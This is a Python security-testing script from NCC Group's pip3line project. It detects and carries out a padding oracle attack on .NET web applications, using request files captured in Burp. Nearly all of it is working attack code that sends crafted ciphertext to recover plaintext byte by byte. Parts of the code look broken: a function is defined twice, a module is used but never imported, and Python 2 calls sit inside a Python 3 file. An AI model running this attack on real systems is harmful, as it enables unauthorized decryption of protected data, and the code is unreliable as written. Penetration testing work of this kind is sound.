#! /usr/bin/env python3
# -*- coding: UTF8 -*-

# Released as open source by NCC Group Plc - http://www.nccgroup.com/
# Developed by Gabriel Caudrelier, gabriel dot caudrelier at nccgroup dot com
# https://github.com/nccgroup/pip3line
# Released under AGPL see LICENSE for more information


import sys
import mtools as mt
import argparse
import binascii
import os
#import poolthread

HOST = ""
URI = ""
useBurpProxy = True
#BlockSizes = [64,32,16,8,4]
BlockSizes = [16,8]
byteFound = -1

def calculateBlockSize(cipherText):
	blockSize = 0
	for bs in BlockSizes:
#        print len(cipherText) % bs
		if (len(cipherText) % bs) == 0:
			# and this one should be good (the highest possible solution)
			print('Block size of',bs)
			blockSize = bs
			break
	return blockSize
	
def toNowhere(s):
	pass

def oracle(payload,opener, url, headers, data, method):
	
	[answer,code] = mt.requestB(opener, url, headers, data, method)
def intToString(intlist):
	st = ''
	for j in intlist:
		st += chr(j)
	return st 

def xorList(list1,list2):
	lenght = min(len(list1),len(list2))
	res = []
	for j in range(lenght):
		res.append(list1[j] ^ list2[j])
	return res

def oracle(opener, url, headers, data, method, k):
	global byteFound
	if byteFound != -1:
		return
	[answer,code] = mt.requestB(opener, url, headers, data, method)
	mt.writeOut('.')
	if code != 500:
		byteFound = k

def decrypt(sampleFile, targetParameter = 'd', ciphertext = None, noIV = True):
	global byteFound
	pool = poolthread.ThreadPool(10)
	opener = mt.createOpener(withBurpProxy=withBurpProxy)
	[url,headers,data,method] = mt.parseBurpData(sampleFile)
	
	print("Extracting ciphertext")
	if ciphertext == None:
		ciphertext = mt.decodeASP(data[targetParameter])

	print("calculating blocksize")
	blockSize = calculateBlockSize(ciphertext)
	print("==> " + str(blockSize))

	IV = '\x00' * blockSize
	[answer,code] = mt.requestB(opener, url, headers, data, method)	
	mt.printRequest = toNowhere
	mt.printAnswer = toNowhere
#	print "Cleaning"
#	if 't' in data:
#		data.pop('t')
	

	bn = len(ciphertext) / blockSize
	cbs = []
	print("parsing cipher block")
	for i in range(bn):
		cbs.append(ciphertext[i*blockSize:(i * blockSize) + blockSize])
	
	print("cipher blocks", [x.encode('hex') for x in cbs])
	cbs.reverse()

	if len(cbs) > 1 and not noIV: 
		IV = [ord(x) for x in cbs.pop()]
	print("IV",IV.encode('hex'))
	numBlock = len(cbs)
	final = []
	print("main loop", numBlock)
	for i in range(numBlock):
		cblock = cbs.pop()

		testpadding = [0] * blockSize
		intermediate = [0] * blockSize
		currentPadding = 1
		for j in range(blockSize -1 ,-1,-1):
			print("j", j)
			byteFound = -1
			for k in range(256):
				if k == 0 and j == blockSize -1:
					continue
				testpadding[j] = k
				data[targetParameter] = mt.encodeASP(intToString(testpadding) + cblock)
				oracle(opener, url, headers, data, method,k)
			if byteFound == -1:
				print("Error no good byte found")
				intermediate[j] = 0
				print("Intermediate : ", intermediate) 
				currentPadding += 1
				for l in range(j,blockSize):
					testpadding[l] = intermediate[l] ^ currentPadding
			else:
				print("Found byte: ", byteFound, " || ", 255 -byteFound, "code", code)
				intermediate[j] = byteFound ^ currentPadding
				print("Intermediate : ", intermediate) 
				currentPadding += 1 
				for l in range(j,blockSize):
					testpadding[l] = intermediate[l] ^ currentPadding

			print("Test padding", testpadding)
		print("Intermediate : ", intToString(intermediate), intToString(intermediate).encode('hex'))
		db = intermediate
		final += db
		print("Decrypted block: ",intToString(db).encode('hex'),"(" +  intToString(db) + ")")
	
	print(intToString(final))
	print(intToString(final).encode('hex'))

def testIfOracle(sampleFile, targetParameter):
	""" Test if the given parameter is an Oracle """
	
	[url,headers,data,method] = mt.parseBurpData(sampleFile)
	print("Test if \'"+targetParameter+"\' is an Oracle") 
	opener = mt.createOpener(withBurpProxy=False)
	print("data=", data[targetParameter])
	try:
		initialCipherText = mt.decodeASP(data[targetParameter].encode())
	except binascii.Error:
		print("Not a valid Base64 string for parameter " +  targetParameter)
		sys.exit(-1)

	cipherText = ''
	blockSize = calculateBlockSize(initialCipherText)

	if len(initialCipherText) == blockSize:
		cipherText = initialCipherText
		print("No IV found")
	else:
		cipherText = initialCipherText[blockSize:]
		print("Possible IV: " + mt.hexify(cipherText))

	print('Valid padding, valid data')
	[answer,code1] = mt.requestB(opener, url, headers, data, method)

	if (code1 != 200):
		print("Error, the initial request must be valid")
		sys.exit(0)

	print('Invalid padding')
	data[targetParameter] = 'Invalid'
	[answer,code2] = mt.requestB(opener, url, headers, data, method)

	print('Valid padding, invalid data')
	data[targetParameter] = ''
	[answer,code3] = mt.requestB(opener, url, headers, data, method)

	if code2 != code3:
		print("==>> vulnerable, mazelthoff!")

		print('Bonus : Null IV plus initialrequest (to be use with the padbuster script)')
		nullIV = '\x00' * blockSize
		data[targetParameter] = mt.encodeASP(str(nullIV) + str(cipherText))
		mt.requestC(opener, url, headers, data, method)
		return True
	else:
		print("... Not vulnerable")

	return False

if __name__ == "__main__":
	
	parser = argparse.ArgumentParser(description='Perform the padding Oracle attack on .NET web application')
	parser.add_argument('-t', '--test-vuln', action='store_const', const=True, default=True, help='Test for the padding Oracle vulnerability')
	parser.add_argument('-b', '--no-burp', action='store_const', const=True, default=False, help='Disable Burp proxying')
	parser.add_argument('-d', '--decrypt', action='store_const', const=True, default=False, help='Decrypt ') 
	parser.add_argument('-s', '--ssl', action='store_const', const=True, default=False, help='use ssl transport ') 
	parser.add_argument('-p', '--parameter', nargs=1, default='d', help='Parameter to use as Oracle')
	parser.add_argument('filename', metavar='Burp request file', type=argparse.FileType('r'), nargs=1, help='Request sample from Burp')

	args = parser.parse_args()
	if os.name != 'posix':
		mt.colors.disable()

	if args.no_burp:
		useBurpProxy = False
	if args.ssl:
		mt.Protocol = 'https'
	else:
		mt.Protocol = 'http'
	
	if args.decrypt:
		decrypt(args.filename[0].name, args.parameter[0])
	elif args.test_vuln:
		testIfOracle(args.filename[0].name,args.parameter[0])
	
